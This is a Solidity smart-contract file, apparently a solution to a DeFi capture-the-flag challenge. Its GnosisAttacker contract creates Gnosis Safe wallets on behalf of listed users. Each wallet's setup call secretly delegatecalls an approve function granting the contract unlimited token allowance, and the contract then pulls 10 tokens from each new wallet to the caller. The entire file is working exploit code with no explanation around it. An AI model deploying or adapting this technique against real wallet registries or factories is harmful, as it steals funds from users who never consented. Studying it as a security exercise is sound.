// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract GnosisAttacker {
    address private immutable gnosisSafe;
    address private immutable gnosisSafeProxyFactory;
    uint256 private constant TOKEN_PAYMENT = 10 ether; // 10 * 10 ** 18

    constructor(address _masteryCopy, address _gnosisSafeProxyFactory) {
        gnosisSafe = _masteryCopy;
        gnosisSafeProxyFactory = _gnosisSafeProxyFactory;
    }

    function approve(address spender, address token) external {
        IERC20(token).approve(spender, type(uint256).max);
    }

    function attack(address _token, address _walletRegistry, address[] calldata _users) public {
        bytes memory approveData = abi.encodeWithSignature("approve(address,address)", address(this), _token);
        for (uint i; i < _users.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = _users[i];
            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)", 
                owners, 1, address(this), approveData, address(0), address(0), 0, address(0)
            );

            GnosisSafeProxy proxy = GnosisSafeProxyFactory(gnosisSafeProxyFactory).createProxyWithCallback(gnosisSafe, initializer, 0, IProxyCreationCallback(_walletRegistry));

            IERC20(_token).transferFrom(address(proxy), msg.sender, TOKEN_PAYMENT);
        }
    }
}